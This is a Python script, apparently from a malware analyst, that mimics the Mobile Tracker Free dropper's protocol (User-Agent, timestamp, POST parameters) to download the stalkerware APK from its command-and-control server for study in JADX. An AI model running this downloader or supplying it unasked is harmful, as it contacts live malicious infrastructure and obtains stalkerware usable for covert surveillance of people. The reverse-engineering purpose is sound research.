#!/usr/bin/env python3
"""
Mobile Tracker Free — Dropper APK downloader
Reproduit le comportement du dropper com.mtf.download v2.7
pour récupérer le vrai APK stalkerware depuis le serveur C2.

Référence : mtf_dropper_analysis.md
"""

import requests
import sys
import json
from datetime import datetime, timedelta
from pathlib import Path

# === IoC extraits du dropper ===
BASE_URL = "https://appapk.mtf.re/"
ENDPOINT_GET_URL = "getURLFTP.php"
USER_AGENT = "KABNKNHFFHDHYD58698347556988AD89GH2020"

HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept-Language": "UTF-8",
    "Connection": "close",
}

# typeVersion: 0 = ARM (armeabi), 1 = autre (x86/x86_64)
TYPE_ARM = "0"
TYPE_OTHER = "1"

OUTPUT_DIR = Path(__file__).parent / "downloaded_apks"


def get_date_check() -> str:
    """Reproduit DownloadAPPActivity.m1190h() — timestamp UTC+10s au format US."""
    dt = datetime.now() + timedelta(seconds=10)
    return dt.strftime("%Y/%m/%d %H:%M:%S")


def step1_get_download_url(session: requests.Session) -> dict | None:
    """
    Étape 1 : POST vers getURLFTP.php
    Params : {"dateCheck": "<timestamp>"}
    Réponse attendue : {"url": "...", "status": "ok"} ou {"status": "no"}
    """
    date_check = get_date_check()
    params = {"dateCheck": date_check}

    print(f"[*] POST {BASE_URL}{ENDPOINT_GET_URL}")
    print(f"    User-Agent: {USER_AGENT}")
    print(f"    Params: {params}")

    try:
        resp = session.post(
            BASE_URL + ENDPOINT_GET_URL,
            data=params,
            headers=HEADERS,
            timeout=30,
        )
        resp.raise_for_status()

        print(f"    Status: {resp.status_code}")
        print(f"    Headers: {dict(resp.headers)}")
        print(f"    Body: {resp.text[:500]}")

        data = resp.json()

        if data.get("status") == "no":
            print("[!] Serveur a répondu status=no — APK non disponible")
            return None

        url = data.get("url", "")
        if not url:
            print("[!] Pas de champ 'url' dans la réponse JSON")
            print(f"    Réponse complète : {json.dumps(data, indent=2)}")
            return None

        print(f"[+] URL du payload récupérée : {url}")
        return {"url": url, "full_response": data}

    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur réseau : {e}")
        return None
    except json.JSONDecodeError:
        print(f"[!] Réponse non-JSON : {resp.text[:500]}")
        return None


def step2_download_apk(
    session: requests.Session,
    apk_url: str,
    type_version: str = TYPE_ARM,
) -> Path | None:
    """
    Étape 2 : POST streaming pour télécharger le vrai APK
    Params : {"dateCheck": "<timestamp>", "typeVersion": "0"}
    """
    date_check = get_date_check()
    params = {"dateCheck": date_check, "typeVersion": type_version}

    full_url = BASE_URL + apk_url if not apk_url.startswith("http") else apk_url

    print(f"\n[*] POST {full_url}")
    print(f"    Params: {params}")

    try:
        resp = session.post(
            full_url,
            data=params,
            headers=HEADERS,
            timeout=60,
            stream=True,
        )
        resp.raise_for_status()

        content_type = resp.headers.get("Content-Type", "")
        content_length = resp.headers.get("Content-Length", "unknown")
        print(f"    Content-Type: {content_type}")
        print(f"    Content-Length: {content_length}")

        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

        arch = "arm" if type_version == TYPE_ARM else "x86"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mtf_payload_{arch}_{timestamp}.apk"
        output_path = OUTPUT_DIR / filename

        downloaded = 0
        with open(output_path, "wb") as f:
            for chunk in resp.iter_content(chunk_size=4096):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    print(f"\r    Downloaded: {downloaded:,} bytes", end="", flush=True)

        print(f"\n[+] APK sauvegardé : {output_path}")
        print(f"    Taille : {downloaded:,} bytes")
        return output_path

    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur téléchargement : {e}")
        return None


def main():
    print("=" * 60)
    print("Mobile Tracker Free — Dropper APK Downloader")
    print("Reproduit le protocole de com.mtf.download v2.7")
    print("=" * 60)

    arch = TYPE_ARM
    if len(sys.argv) > 1 and sys.argv[1] in ("x86", "other"):
        arch = TYPE_OTHER
        print(f"[*] Architecture : x86/other")
    else:
        print(f"[*] Architecture : ARM (défaut)")

    session = requests.Session()

    # Étape 1 : récupérer l'URL du payload
    print(f"\n{'='*40}")
    print("ÉTAPE 1 : Récupération URL payload")
    print(f"{'='*40}")
    result = step1_get_download_url(session)

    if result is None:
        print("\n[!] Impossible de récupérer l'URL. Abandon.")
        # Sauvegarder quand même la réponse pour analyse
        return 1

    # Sauvegarder la réponse JSON du serveur
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    json_path = OUTPUT_DIR / "server_response.json"
    with open(json_path, "w") as f:
        json.dump(result["full_response"], f, indent=2)
    print(f"[+] Réponse serveur sauvegardée : {json_path}")

    # Étape 2 : télécharger l'APK
    print(f"\n{'='*40}")
    print("ÉTAPE 2 : Téléchargement du payload")
    print(f"{'='*40}")
    apk_path = step2_download_apk(session, result["url"], arch)

    if apk_path is None:
        print("\n[!] Échec du téléchargement.")
        return 1

    # Résumé
    print(f"\n{'='*60}")
    print("RÉSUMÉ")
    print(f"{'='*60}")
    print(f"  C2 URL      : {BASE_URL}")
    print(f"  Endpoint    : {ENDPOINT_GET_URL}")
    print(f"  Payload URL : {result['url']}")
    print(f"  APK local   : {apk_path}")
    print(f"  JSON réponse: {json_path}")
    print(f"\nProchaine étape : analyser {apk_path.name} dans JADX")
    return 0


if __name__ == "__main__":
    sys.exit(main())
